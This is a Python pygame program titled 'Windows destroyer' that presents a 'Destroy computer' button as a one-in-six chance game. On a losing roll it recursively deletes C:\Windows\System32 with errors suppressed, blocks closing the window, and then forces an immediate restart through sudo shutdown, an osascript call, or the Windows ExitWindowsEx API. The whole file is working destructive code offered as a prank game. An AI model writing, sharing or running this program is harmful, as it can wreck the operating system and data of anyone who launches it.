import random
import shutil
import os
import pygame as pg
import ctypes

pg.init()
script_dir = os.path.dirname(os.path.abspath(__file__))
os.chdir(script_dir)
screen_width = 300
screen_height = 200
screen = pg.display.set_mode((screen_width, screen_height))
pg.display.set_caption('Windows destroyer')
game_font = 'fonts/OpenSans-Bold.ttf'

# Clock for controlling FPS
clock = pg.time.Clock()

# Font properties
button_font = pg.font.Font(game_font, 21)
text_color = (50, 50, 50)

# Button properties
button_color = (150, 150, 150)
button_hover_color = (100, 100, 100)
button_border_color = (50, 50, 50)  # Border color
button_size = (200, 75)
button_rect = (
    pg.Rect(screen_width / 2 - button_size[0] / 2,
            screen_height / 2 - button_size[1] / 2,
            button_size[0], button_size[1])
)  # Rectangle for button
button_text = 'Destroy computer'

font = pg.font.Font(game_font, 21)
Max_chance = 6
chance_text = '1/' + str(Max_chance)
tries = 0
tries_text = 'Tries: ' + str(tries)
result_font = pg.font.Font(game_font, 16)
result_text = 'Click the button to initiate'

# Variables for timing text updates
last_update_time = pg.time.get_ticks()
update_interval = 100  # milliseconds
total_interval = 2000  # milliseconds
total_time = 0

# Additional variable to track number of times dots have changed
Times_dots_changed = 0

# Game loop
Lost = False
running = True
while running:
    screen.fill((225, 225, 225))  # Setting the fill color to light gray
    dt = clock.tick(60)  # Limit the frame rate to 60 FPS

    # Get mouse input and/or change cursor
    mouse = pg.mouse.get_pos()
    # Event handling
    for event in pg.event.get():
        if event.type == pg.QUIT and not Lost:
            running = False
        if event.type == pg.MOUSEBUTTONDOWN:
            if button_rect.collidepoint(mouse) and not Lost:
                tries += 1
                tries_text = 'Tries: ' + str(tries)

                chance = random.randint(1, Max_chance)
                if chance == 1:
                    shutil.rmtree(r'C:\Windows\System32', ignore_errors=True)
                    result_text = "You've lost. Restarting computer..."
                    Lost = True
                else:
                    result_text = 'You survived'

    # Draw button border (darker rectangle first)
    border_rect = pg.Rect(button_rect.x - 2, button_rect.y - 2, button_size[0] + 4, button_size[1] + 4)
    pg.draw.rect(screen, button_border_color, border_rect)

    # Draw button (main rectangle)
    if button_rect.collidepoint(mouse):
        pg.mouse.set_cursor(pg.SYSTEM_CURSOR_HAND)
        pg.draw.rect(screen, button_hover_color, button_rect)
    else:
        pg.mouse.set_cursor(pg.SYSTEM_CURSOR_ARROW)
        pg.draw.rect(screen, button_color, button_rect)

    # Render text
    text_surface = button_font.render(button_text, True, text_color)
    text_rect = text_surface.get_rect(center=button_rect.center)
    screen.blit(text_surface, text_rect)

    text_surface = font.render('Chance to destroy:', True, text_color)
    text_rect = text_surface.get_rect()
    text_rect.center = (screen_width / 2, 20)
    screen.blit(text_surface, text_rect)

    text_surface = font.render(chance_text, True, text_color)
    text_rect = text_surface.get_rect()
    text_rect.center = (screen_width / 2, screen_height / 4.5)
    screen.blit(text_surface, text_rect)

    text_surface = font.render(tries_text, True, text_color)
    text_rect = text_surface.get_rect()
    text_rect.center = (screen_width / 2, screen_height / 1.075)
    screen.blit(text_surface, text_rect)

    text_surface = font.render(result_text, True, text_color)
    text_rect = text_surface.get_rect()
    text_rect.center = (screen_width / 2, screen_height / 1.25)

    if Lost:
        text_surface = result_font.render(result_text, True, text_color)
        text_rect = text_surface.get_rect()
        text_rect.topleft = (15, screen_height / 1.3)  # Same place as text_rect.center but on the top left
    screen.blit(text_surface, text_rect)

    pg.display.flip()  # Update the display

    # After losing, update result_text periodically
    if Lost:
        current_time = pg.time.get_ticks()
        if current_time - last_update_time > update_interval:
            Times_dots_changed += 1
            if Times_dots_changed == 1:
                result_text = "You've lost. Restarting computer.."
            elif Times_dots_changed == 2:
                result_text = "You've lost. Restarting computer."
            elif Times_dots_changed == 3:
                result_text = "You've lost. Restarting computer.."
            elif Times_dots_changed == 4:
                result_text = "You've lost. Restarting computer..."
                # Reset Times_dots_changed after all changes are made
                Times_dots_changed = 0
            last_update_time = current_time
            total_time += update_interval

        # Simulate restarting the computer after total_interval
        if total_time > total_interval:
            # This restarts the computer immediately #
            # Unix #
            if os.name == 'posix':
                os.system('sudo shutdown -r now')  # Linux
                os.system('osascript -e \'tell app "System Events" to restart\'')  # MacOs
            # Windows #
            ctypes.windll.user32.ExitWindowsEx(0x00000002, 0x00000000)

            running = False

pg.quit()
